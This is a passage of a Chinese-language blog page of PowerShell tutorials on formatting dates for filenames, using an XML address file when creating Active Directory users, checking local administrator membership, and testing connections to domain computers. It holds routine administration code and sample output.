class="line">Enabled           : True</span><br><span class="line">GivenName         : Jerry</span><br><span class="line">LastLogonDate     : <span class="number">20</span>/<span class="number">02</span>/<span class="number">2021</span> <span class="number">04</span>:<span class="number">20</span>:<span class="number">42</span></span><br><span class="line">Name              : Jerry Garcia</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : ae31ca0d<span class="literal">-3f01</span><span class="literal">-4eb4</span><span class="literal">-8593</span><span class="literal">-b1d79c71f912</span></span><br><span class="line">SamAccountName    : JerryG</span><br><span class="line">SID               : S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2550804810</span><span class="literal">-443649076</span><span class="literal">-1856842782</span><span class="literal">-500</span></span><br><span class="line">Surname           : Garcia</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating a file with yesterday&#x27;s date</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Creating a file with today&#x27;s date</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Yesterday</span>     = (<span class="built_in">Get-Date</span>).AddDays(<span class="literal">-1</span>).ToString() <span class="operator">-replace</span> <span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;-&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$YesterdayDate</span> = (<span class="variable">$Yesterday</span> <span class="operator">-split</span> <span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$YesterdayFN</span>   = <span class="string">&quot;Results for <span class="variable">$YesterdayDate</span>.Txt&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; </span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="built_in">New-Item</span> <span class="literal">-Path</span> C:Results <span class="literal">-Name</span>  <span class="variable">$YesterdayFN</span> <span class="literal">-ItemType</span> File</span><br><span class="line"></span><br><span class="line">Directory: C:Results</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line"><span class="literal">-a</span>---          <span class="number">20</span>/<span class="number">02</span>/<span class="number">2021</span>    <span class="number">12</span>:<span class="number">56</span>              <span class="number">0</span> Results <span class="keyword">for</span> <span class="number">19</span><span class="literal">-02</span><span class="literal">-2021</span>.Txt</span><br></pre></td></tr></table></figure>

<p>在最后一个示例中，您需要对 <code>Get-Date</code> 返回的日期/时间进行一些操作，以获得 Windows 接受的文件名。 因为 <code>Get-Date</code> 返回一个字符串，其中包含“/”字符 <code>New-Item</code> 将其作为路径字符。 您可以使用 <code>-Replace</code> 运算符将“/”字符替换为“-”。 此外，在执行替换后，您最终会得到一个（不需要的）时间值。 您可以使用 <code>-Split</code> 运算符只提取日期，这就是您想要的文件名。 一旦你得到了日期，你就可以创建你可以为文件创建一个文件名。</p>
<p>另一种基于 <code>Get-Date</code> 生成文件名的方法是使用 <code>ToString()</code> 方法并指定您想要的确切输出，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$YesterdayDate</span> = (<span class="built_in">Get-Date</span>).AddDays(<span class="literal">-1</span>).ToString(<span class="string">&#x27;yyyy-MM-dd&#x27;</span>)         </span><br><span class="line"><span class="variable">$YesterdayFN</span>   = <span class="string">&quot;Results for <span class="variable">$YesterdayDate</span>.Txt&quot;</span></span><br></pre></td></tr></table></figure>

<p>另一点值得一提的是 Windows 试图以文艺的方式显示日期。 在大多数情况下，<code>Get-Date</code> 都能很好地将日期字符串转换为您想要的日期。 但是如果你想要一个特定的结果，使用 <code>ToString()</code> 和一个日期格式字符串可能会更好——而且代码行更少。</p>
<p>更不用说，您可以在一行程序中完成所有这些文件名操作。我把这个留作练习。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>.NET 提供了丰富的日期和时间结构 (<code>System.DateTime</code>)。 此结构包含许多属性，例如给定日期/时间的日、月、小时、毫秒。 您还可以获得多种方法，使您能够通过添加或减去小时、天等来操作日期。您可以使用 <code>Get-Date</code> cmdlet 获取当前日期/时间或特定日期/时间的对象。 <code>Get-Date</code> 返回 <code>System.DateTime</code> 的对象。 您可以使用 <code>System.DateTime</code> 结构的方法来获取相关日期，例如昨天、上个月或前 2 年 42 天和前 32 毫秒。</p>
<h3 id="致敬感谢-1"><a href="#致敬感谢-1" class="headerlink" title="致敬感谢"></a>致敬感谢</h3><p>本文基于Scripting Guys早先的一篇博客文章<a href="https://devblogs.microsoft.com/scripting/how-can-i-get-yesterdays-date">How can I get yesterday’s date?</a></p>
<h2 id="在新员工PowerShell脚本中利用XML"><a href="#在新员工PowerShell脚本中利用XML" class="headerlink" title="在新员工PowerShell脚本中利用XML"></a>在新员工PowerShell脚本中利用XML</h2><p>我将展示如何利用 XML 文件来引用信息，以帮助增强您的 Active Directory 用户帐户。 这将确保诸如 Outlook 联系人卡片之类的内容是正确的，但也允许您在以后使用此信息，例如 根据办公室位置创建动态通讯组列表，或为建筑物中特定楼层的火灾疏散计划设置 NTFS 权限。 使用 XML 允许不懂 PowerShell 的用户跳入文件并修改或添加地址信息。 意味着脚本中的纯文本字符串更少。</p>
<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>您有多个子公司，每个子公司都有自己的办公室和地址。 您需要确保您创建的每个新用户都具有基于工作地点的正确地址和联系信息。 虽然在这篇文章中我谈论的是用户帐户，但没有理由不能对计算机帐户或资源应用相同的逻辑。 没有人会喜欢四处打听您 10 分钟前应该在的会议室的位置！</p>
<h3 id="入门-创建XML"><a href="#入门-创建XML" class="headerlink" title="入门 - 创建XML"></a>入门 - 创建XML</h3><p>要创建 xml，我们将使用 <code>XmlWriter</code> 类，将其放入一个变量中以构建并添加一些格式设置选项（这样可以更轻松地查看组信息）。 像这样：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$XMLPath</span> = <span class="string">&quot;C:\Users\sam\AD-References.xml&quot;</span></span><br><span class="line"><span class="variable">$XMLWriter</span> = <span class="built_in">New-Object</span> System.XML.XMlTextWriter(<span class="variable">$XMLPath</span>,<span class="variable">$null</span>)</span><br><span class="line"><span class="variable">$xmlWriter</span>.Formatting = <span class="string">&#x27;Indented&#x27;</span></span><br><span class="line"><span class="variable">$xmlWriter</span>.Indentation = <span class="number">1</span></span><br><span class="line"><span class="variable">$XmlWriter</span>.IndentChar = <span class="string">&quot;`t&quot;</span></span><br></pre></td></tr></table></figure>

<p>运行上面的命令，我们会得到一个新的 xml 源文件，里面什么都没有； 我们已经准备好充实它。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># write the header</span></span><br><span class="line"><span class="variable">$xmlWriter</span>.WriteStartDocument()</span><br><span class="line"><span class="comment"># set XSL statements</span></span><br><span class="line"><span class="variable">$xmlWriter</span>.WriteProcessingInstruction(<span class="string">&quot;xml-stylesheet&quot;</span>, <span class="string">&quot;type=&#x27;text/xsl&#x27; href=&#x27;style.xsl&#x27;&quot;</span>)</span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteStartElement(<span class="string">&#x27;Companies&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>现在我们有进展了。我们已经启动了我们的公司元素。让我们创建一个公司，并在下面添加一些办公室信息。然后我们将完成XML文档。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Start Company 1</span></span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteStartElement(<span class="string">&#x27;Company-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create Birmingham Office</span></span><br><span class="line"><span class="variable">$xmlWriter</span>.WriteStartElement(<span class="string">&#x27;Birmingham&#x27;</span>)</span><br><span class="line"><span class="variable">$XmlWriter</span>.WriteElementString(<span class="string">&#x27;Street&#x27;</span>, <span class="string">&#x27;Unit 77, 132 Dummy Lane&#x27;</span>)</span><br><span class="line"><span class="variable">$XmlWriter</span>.WriteElementString(<span class="string">&#x27;City&#x27;</span>, <span class="string">&#x27;Birmingham&#x27;</span>)</span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteElementString(<span class="string">&#x27;State&#x27;</span>, <span class="string">&#x27;Staffordshire&#x27;</span>)</span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteElementString(<span class="string">&#x27;Postcode&#x27;</span>, <span class="string">&#x27;B1 1BB&#x27;</span>)</span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteElementString(<span class="string">&#x27;Country&#x27;</span>, <span class="string">&#x27;GB&#x27;</span>)</span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteEndElement()</span><br><span class="line"></span><br><span class="line"><span class="comment">#End Company 1</span></span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteEndElement()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finish up document</span></span><br><span class="line"><span class="variable">$XMLWriter</span>.WriteEndElement()</span><br><span class="line"><span class="variable">$xmlWriter</span>.WriteEndDocument()</span><br><span class="line"><span class="variable">$xmlWriter</span>.Flush()</span><br><span class="line"><span class="variable">$xmlWriter</span>.Close()</span><br></pre></td></tr></table></figure>

<p>让我们在运行这段代码后查看完成的XML。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;?xml<span class="literal">-stylesheet</span> <span class="built_in">type</span>=<span class="string">&#x27;text/xsl&#x27;</span> href=<span class="string">&#x27;style.xsl&#x27;</span>?&gt;</span><br><span class="line">&lt;Companies&gt;</span><br><span class="line">    &lt;Company<span class="literal">-1</span>&gt;</span><br><span class="line">        &lt;Birmingham&gt;</span><br><span class="line">            &lt;Street&gt;Unit <span class="number">77</span>, <span class="number">132</span> Dummy Lane&lt;/Street&gt;</span><br><span class="line">            &lt;City&gt;Birmingham&lt;/City&gt;</span><br><span class="line">            &lt;State&gt;Staffordshire&lt;/State&gt;</span><br><span class="line">            &lt;Postcode&gt;B1 <span class="number">1</span>BB&lt;/Postcode&gt;</span><br><span class="line">            &lt;Country&gt;GB&lt;/Country&gt;</span><br><span class="line">        &lt;/Birmingham&gt;</span><br><span class="line">    &lt;/Company<span class="literal">-1</span>&gt;</span><br><span class="line">&lt;/Companies&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PowerShell-使用XML"><a href="#PowerShell-使用XML" class="headerlink" title="PowerShell - 使用XML"></a>PowerShell - 使用XML</h3><p>现在我们有了一些可用于 PowerShell 的可用数据。 您可以为创建用户的办公室/公司添加更多元素。 接下来如何引用它就很清楚了。</p>
<p>提示：将您的 XML 创建脚本保存在与引用它的脚本相同的位置； 这使得路径变量更容易，如果 xml 丢失，也方便您快速创建它。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Load up the XML for reference later, if it&#x27;s been deleted recreate it using the creation script.</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$XMLPath</span> = <span class="string">&quot;<span class="variable">$PSScriptRoot</span>\AD-References.xml&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$XMLPath</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$XML</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> XML</span><br><span class="line">        <span class="variable">$XML</span> = [<span class="built_in">XML</span>] (<span class="built_in">Get-Content</span> <span class="variable">$XMLPath</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">Start-Process</span> <span class="string">&quot;<span class="variable">$PSScriptRoot</span>\Write-XML.ps1&quot;</span> <span class="literal">-Wait</span></span><br><span class="line">        <span class="variable">$XML</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> XML</span><br><span class="line">        <span class="variable">$XML</span> = [<span class="built_in">XML</span>] (<span class="built_in">Get-Content</span> <span class="variable">$XMLPath</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里，我们正在测试 XML 的路径，如果不存在，则再次运行创建脚本。 然后，我们将其加载到一个变量中以供调用。</p>
<p>我们可以通过使用 <code>Read-Host</code> 和一些附加的验证来为新用户收集信息。 像这样：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">ValidatePattern</span>(<span class="string">&quot;\w+&quot;</span>)]<span class="variable">$FirstName</span> = <span class="built_in">Read-Host</span> <span class="literal">-Prompt</span> <span class="string">&quot;Please input users first name&quot;</span></span><br><span class="line">[<span class="type">ValidatePattern</span>(<span class="string">&quot;\w+&quot;</span>)]<span class="variable">$LastName</span> = <span class="built_in">Read-Host</span> <span class="literal">-Prompt</span> <span class="string">&quot;Please input users last name&quot;</span></span><br><span class="line">[<span class="type">ValidatePattern</span>(<span class="string">&quot;\w+&quot;</span>)]<span class="variable">$Company</span> = <span class="built_in">Read-Host</span> <span class="literal">-Prompt</span> <span class="string">&quot;Please input users company&quot;</span></span><br><span class="line">[<span class="type">ValidatePattern</span>(<span class="string">&quot;\w+&quot;</span>)]<span class="variable">$Office</span> = <span class="built_in">Read-Host</span> <span class="literal">-Prompt</span> <span class="string">&quot;Please input users office&quot;</span></span><br></pre></td></tr></table></figure>

<p>十分简单。 4 个问题和 4 个答案，分为 4 个变量。 与其问很多问题来查找邮政编码或国家/地区等信息，不如使用我们的 XML！</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Declare some more variables</span></span><br><span class="line"><span class="variable">$FirstInitial</span> = <span class="string">&quot;<span class="variable">$FirstName</span>.substring(0,1)&quot;</span></span><br><span class="line"><span class="variable">$Path</span> = <span class="string">&#x27;OU=Users,OU=Contoso,DC=Contoso,DC=com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Build hashtable of new user parameters</span></span><br><span class="line">  <span class="variable">$NewUserParams</span> =<span class="selector-tag">@</span>&#123;</span><br><span class="line">        GivenName = <span class="variable">$FirstName</span></span><br><span class="line">        Name = <span class="string">&quot;<span class="variable">$FirstName</span> <span class="variable">$LastName</span>&quot;</span></span><br><span class="line">        Surname = <span class="variable">$LastName</span></span><br><span class="line">        SamAccountName = <span class="string">&quot;<span class="variable">$FirstInitial</span> + <span class="variable">$LastName</span>&quot;</span></span><br><span class="line">        DisplayName = <span class="string">&quot;<span class="variable">$FirstName</span> <span class="variable">$LastName</span>&quot;</span></span><br><span class="line">        UserPrincipalName = <span class="string">&quot;<span class="variable">$userName</span>&quot;</span> + <span class="string">&quot;@&quot;</span> + <span class="string">&quot;contoso.com&quot;</span></span><br><span class="line">        AccountPassword = <span class="variable">$password</span></span><br><span class="line">        Office = <span class="variable">$Office</span></span><br><span class="line">        StreetAddress = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$office</span>.Street).Trim()</span><br><span class="line">        PostalCode = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.Postcode).Trim()</span><br><span class="line">        City = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.City).Trim()</span><br><span class="line">        State = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.State).Trim()</span><br><span class="line">        Country = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.Country).Trim()</span><br><span class="line">        Path = <span class="variable">$Path</span></span><br><span class="line">        ChangePasswordAtLogon = <span class="variable">$false</span></span><br><span class="line">        Enabled = <span class="variable">$true</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># Create the user</span></span><br><span class="line"><span class="built_in">New-ADUser</span> @NewUserParams</span><br></pre></td></tr></table></figure>

<p>就这么简单，使用点符号浏览 xml 元素，并去掉不需要的空格。 为方便起见，简单处理如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">StreetAddress = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.Street).Trim()</span><br><span class="line">PostalCode = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.Postcode).Trim()</span><br><span class="line">City = (<span class="variable">$XML</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.City).Trim()</span><br><span class="line">State = (<span class="variable">$xml</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.State).Trim()</span><br><span class="line">Country = (<span class="variable">$xml</span>.Companies.<span class="variable">$Company</span>.<span class="variable">$Office</span>.Country).Trim()</span><br></pre></td></tr></table></figure>

<h3 id="有用的笔记"><a href="#有用的笔记" class="headerlink" title="有用的笔记"></a>有用的笔记</h3><ul>
<li>在创建XML元素时要小心!不允许有空格!如果XML元素中有空格，您将得到XML Writer错误。我用-来代替空格。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$XMLWriter</span>.WriteStartElement(<span class="string">&#x27;Company-1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>您使用 <code>Read-Host</code> 输入的变量需要与 XML 中的元素名称相匹配。 您可以使用验证脚本来验证您的输入。 这是<a href="https://adamtheautomator.com/powershell-validatescript">与验证输入有关的所有内容</a>的有用读物。</li>
</ul>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>您真的可以进一步充实这一点，并将大量信息加载到 XML 中以供调用，例如 公司项目信息，可以添加用户的 AD 组集，管理书签 URL（然后复制到注册表项中）。</p>
<h2 id="如何判断一个用户是本地管理员"><a href="#如何判断一个用户是本地管理员" class="headerlink" title="如何判断一个用户是本地管理员"></a>如何判断一个用户是本地管理员</h2><p>问题：我们在登录脚本中执行的某些操作要求用户是本地管理员。 脚本如何使用 PowerShell 7 判断用户是否是本地管理员。</p>
<p>解答：简单，使用 PowerShell 7 和 LocalAccounts 模块。</p>
<h3 id="本地用户和组"><a href="#本地用户和组" class="headerlink" title="本地用户和组"></a>本地用户和组</h3><p>让我们先从回顾 Windows 中的本地用户和组开始吧。</p>
<p>除了域控制器之外，每个 Windows 系统都维护一组本地帐户——本地用户和本地组。 域控制器使用 AD，并没有真正的本地帐户。 在设置权限时，除了加入域的主机上的域用户和域组之外，您还可以使用这些本地帐户。 您可以使用本地帐户或域帐户登录到给定的服务器。 在域控制器上，您只能使用域帐户登录。</p>
<p>与 AD 组一样，本地组和本地用户各有一个唯一的安全 ID (SID)。 当您授予本地用户或组访问文件或文件夹的权限时，Windows 会将该 SID 添加到对象的访问控制列表中。 这与 Windows 允许您将本地文件或文件夹的权限授予任何 Active Directory 用户或组的方式相同。</p>
<p>此外，Windows 和某些 Windows 功能会创建“众所周知的”本地组。 目的是将用户添加到这些组中，以使这些用户能够仅在这些服务器上执行特定的管理功能。</p>
<p>旧方法，您可能已经将 <code>Wscript.Network</code> COM 对象与 ADSI 结合使用。 当然，您可以在 PowerShell 7 中使用旧方法，但何必呢？ PowerShell 7 的好消息是，您可以使用 <code>Microsoft.PowerShell.LocalAccounts</code> 模块来管理本地帐户。 在撰写本文时，这是一个 Windows-only 的模块（非跨平台模块）。</p>
<h3 id="Microsoft-PowerShell-LocalAccounts模块"><a href="#Microsoft-PowerShell-LocalAccounts模块" class="headerlink" title="Microsoft.PowerShell.LocalAccounts模块"></a>Microsoft.PowerShell.LocalAccounts模块</h3><p>在 PowerShell 7 for Windows 中，您可以使用 <code>Microsoft.PowerShell.LocalAccounts</code> 模块来管理本地用户和组。 该模块是 PowerShell 7 从 <code>C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.LocalAccounts</code> 加载的 Windows PowerShell 模块。</p>
<p>该模块包含 15 个 cmdlet，您可以这样查看：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-Command</span> <span class="literal">-Module</span> Microsoft.PowerShell.LocalAccounts</span><br><span class="line"></span><br><span class="line">CommandType     Name                       Version    Source</span><br><span class="line">-----------     ----                       -------    ------</span><br><span class="line">Cmdlet          <span class="built_in">Add-LocalGroupMember</span>       <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Disable-LocalUser</span>          <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Enable-LocalUser</span>           <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Get-LocalGroup</span>             <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Get-LocalGroupMember</span>       <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Get-LocalUser</span>              <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">New-LocalGroup</span>             <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">New-LocalUser</span>              <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Remove-LocalGroup</span>          <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Remove-LocalGroupMember</span>    <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Remove-LocalUser</span>           <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Rename-LocalGroup</span>          <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Rename-LocalUser</span>           <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Set-LocalGroup</span>             <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br><span class="line">Cmdlet          <span class="built_in">Set-LocalUser</span>              <span class="number">1.0</span>.<span class="number">0.0</span>    Microsoft.PowerShell.LocalAccounts</span><br></pre></td></tr></table></figure>

<p>如您所知，这些 cmdlet 允许您添加、删除、更改、启用和禁用本地用户或本地组，并且它们允许您添加、删除和获取本地组的成员。 这些 cmdlet 与 ActiveDirectory cmdlet 大致相似，但适用于本地用户。 如上所述，如果您愿意或需要，您可以将域用户/组用作本地组的成员。</p>
<p>您可以使用 <code>Get-LocalGroupMember</code> 命令查看本地组的成员，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&#x27;Administrators&#x27;</span></span><br><span class="line"></span><br><span class="line">ObjectClass Name                     PrincipalSource</span><br><span class="line">----------- ----                     ---------------</span><br><span class="line"><span class="built_in">Group</span>       COOKHAM\Domain Admins    ActiveDirectory</span><br><span class="line">User        COOKHAM24\Administrator  Local</span><br><span class="line">User        COOKHAM\JerryG           ActiveDirectory</span><br><span class="line">User        COOKHAM24\Dave           Local</span><br></pre></td></tr></table></figure>

<p>正如您在此输出中看到的，此主机上的本地管理员组包含域用户和组以及本地用户。</p>
<h3 id="用户是否为管理员"><a href="#用户是否为管理员" class="headerlink" title="用户是否为管理员"></a>用户是否为管理员</h3><p>如上所示，获取任何本地组的成员很容易。 但是，如果您想知道给定用户是否是某个本地管理组的成员怎么办？ 这也很简单，只需几步即可。 获取当前用户名称的一种方法是使用 whoami.exe。 然后你可以获取本地管理员组的成员。 最后，您检查当前登录的用户是否是该组的成员。 所有这些看起来像这样：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="comment"># Get who I am</span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$Me</span> = whoami.exe</span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$Me</span> </span><br><span class="line">Cookham\JerryG</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="comment"># Get members of administrators group</span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$Admins</span> = <span class="built_in">Get-LocalGroupMember</span> <span class="literal">-Name</span> Administrators | </span><br><span class="line">       <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> name</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="comment"># Check to see if this user is an administrator and act accordingly</span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="keyword">if</span> (<span class="variable">$Admins</span> <span class="operator">-Contains</span> <span class="variable">$Me</span>) &#123;<span class="string">&quot;<span class="variable">$Me</span> is a local administrator&quot;</span>&#125; <span class="keyword">else</span> &#123;<span class="string">&quot;<span class="variable">$Me</span> is NOT a local administrator&quot;</span>&#125;</span><br><span class="line">Cookham\JerryG is a local administrator</span><br></pre></td></tr></table></figure>

<p>如果管理组包含运行脚本的用户，则 $Me 是该本地管理组中的用户。</p>
<p>在这篇文章中，我们只是回应了一个事实，即用户是不是本地管理员组的成员。 您可以调整它以确保用户在尝试运行某些命令之前是适当组的成员。 您还可以调整它以检查其他本地组的成员身份，例如可能相关的 Backup Operators 或 Hyper-V Users。</p>
<p>在您的登录脚本中，一旦您知道该用户是本地管理组的成员，您就可以执行任何需要该成员资格的任务。 如果用户不是该组的成员，您可以回应这一事实，并避免使用相关的 cmdlet。</p>
<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>使用PowerShell 7中的本地账户模块，轻松管理本地用户组！ 当然，您可以在 Windows PowerShell 中以相同的方式管理其他组。</p>
<h3 id="致敬"><a href="#致敬" class="headerlink" title="致敬"></a>致敬</h3><p>本文最初是一个基于VBS的解决方案，如之前的<a href="https://devblogs.microsoft.com/scripting/how-can-i-determine-if-a-user-is-a-local-administrator/">博客文章</a>所述。我不知道原帖子的作者是谁，但是谢谢。</p>
<h2 id="在-Active-Directory-中测试与计算机的连接"><a href="#在-Active-Directory-中测试与计算机的连接" class="headerlink" title="在 Active Directory 中测试与计算机的连接"></a>在 Active Directory 中测试与计算机的连接</h2><p>问题：作为管理员，我经常需要对我域中的服务器进行大量报告。 是否有一种简单的方法来测试与我的域中的每台服务器或特定 <a href="https://www.anquanke.com/post/id/195737#h2-11">OU</a> 中的每台服务器或客户端主机的连接？</p>
<p>解答：您当然可以使用 PowerShell 来做到这一点！ 您可以使用 <code>ActiveDirectory</code> cmdlet 和 <code>Test-Connection</code>，尽管它并不像人们想象的那么简单。</p>
<h3 id="使用ActiveDirectory模块"><a href="#使用ActiveDirectory模块" class="headerlink" title="使用ActiveDirectory模块"></a>使用ActiveDirectory模块</h3><p>Microsoft 开发了多个模块来帮助您在组织中或通过 Azure 部署和管理 AD。 <code>ActiveDirectory</code> 模块是 Microsoft 随 Windows Server 一起提供的模块（尽管默认情况下未安装）。 您还可以在 Windows 10 主机上为 AD 加载Remote Server Administration (RSAT) 模块。 RSAT 模块允许您使用 PowerShell 从远程计算机管理 AD。 有关 <code>ActiveDirectory</code> 模块的更多详细信息，请参阅 <a href="https://docs.microsoft.com/powershell/module/addsadministration/">ActiveDirectory</a> 模块文档。</p>
<p>使用 <code>Get-ADComputer</code> 帐户返回有关 AD 中部分或所有计算机的详细信息。 有多种方法可以使用 <code>Get-ADComputer</code> 来获取您想要的计算机帐户以及您需要的任何属性。 其中包括使用 <strong>Identity</strong> 和 <strong>Filter</strong> 参数。</p>
<p><code>Get-ADComputer</code> 返回的每个计算机帐户都包含两个重要属性：<strong>Name</strong> 和 <strong>DNSHostName</strong>。 <strong>Name</strong> 属性是计算机的单标签名称（又名 NetBIOS 名称）。 <strong>DNSHostName</strong> 属性是计算机的完全限定 DNS 名称（FQDN）。 像这样：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> * | <span class="built_in">Format-Table</span> <span class="literal">-Property</span> Name, DNSHostName</span><br><span class="line"></span><br><span class="line">Name         DNSHostName</span><br><span class="line">----         -----------</span><br><span class="line">COOKHAM1     Cookham1.cookham.net</span><br><span class="line">win10lt      Win10LT.cookham.net</span><br><span class="line">cookham24    cookham24.cookham.net</span><br><span class="line">SLTPC        sltpc.cookham.net</span><br><span class="line">COOKHAM4LTDC Cookham4LTDC.cookham.net</span><br></pre></td></tr></table></figure>

<p>因此，您可能会认为测试与每台计算机的连接很简单。 您将 <code>Get-ADComputer</code> 的输出通过管道传输到 <code>Test-Connection</code>，它就可以正常工作。 可悲的是，事情并不是那么简单。</p>
<p>如果您尝试这样做，您会看到以下内容：</p>
